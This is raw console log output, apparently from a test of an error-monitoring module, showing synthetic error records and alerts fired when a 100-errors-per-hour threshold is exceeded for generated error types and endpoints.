WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953514Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4938'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953564Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4939'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4940'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4941'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953714Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4942'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953763Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4943'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953831Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4944'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953923Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4945'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953984Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4946'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954042Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4947'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4948'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4949'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.954197Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.954263Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_0\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_0, /api/endpoint_50\nStatus Codes: 400, 450, 500, 550\nFirst Occurrence: 2025-07-05T15:23:43.683255\nLast Occurrence: 2025-07-05T15:23:43.954188'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954344Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4950'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.954403Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.954455Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_1\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_1, /api/endpoint_51\nStatus Codes: 401, 451, 501, 551\nFirst Occurrence: 2025-07-05T15:23:43.683427\nLast Occurrence: 2025-07-05T15:23:43.954396'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954504Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4951'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.954556Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.954604Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_2\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_2, /api/endpoint_52\nStatus Codes: 552, 402, 452, 502\nFirst Occurrence: 2025-07-05T15:23:43.683498\nLast Occurrence: 2025-07-05T15:23:43.954550'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4952'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.954702Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.954753Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_3\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_3, /api/endpoint_53\nStatus Codes: 553, 403, 453, 503\nFirst Occurrence: 2025-07-05T15:23:43.683556\nLast Occurrence: 2025-07-05T15:23:43.954696'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954801Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4953'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.954854Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.954903Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_4\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_4, /api/endpoint_54\nStatus Codes: 504, 554, 404, 454\nFirst Occurrence: 2025-07-05T15:23:43.683611\nLast Occurrence: 2025-07-05T15:23:43.954848'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.954951Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4954'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.955002Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.955051Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_5\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_5, /api/endpoint_55\nStatus Codes: 505, 555, 405, 455\nFirst Occurrence: 2025-07-05T15:23:43.683665\nLast Occurrence: 2025-07-05T15:23:43.954995'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.955097Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4955'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.955170Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.955258Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_6\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_6, /api/endpoint_56\nStatus Codes: 456, 506, 556, 406\nFirst Occurrence: 2025-07-05T15:23:43.683725\nLast Occurrence: 2025-07-05T15:23:43.955155'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.955324Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4956'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.955382Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.955434Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_7\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_7, /api/endpoint_57\nStatus Codes: 457, 507, 557, 407\nFirst Occurrence: 2025-07-05T15:23:43.683780\nLast Occurrence: 2025-07-05T15:23:43.955375'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.955481Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4957'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.955534Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.955583Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_8\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_8, /api/endpoint_58\nStatus Codes: 408, 458, 508, 558\nFirst Occurrence: 2025-07-05T15:23:43.683834\nLast Occurrence: 2025-07-05T15:23:43.955528'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.955634Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4958'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
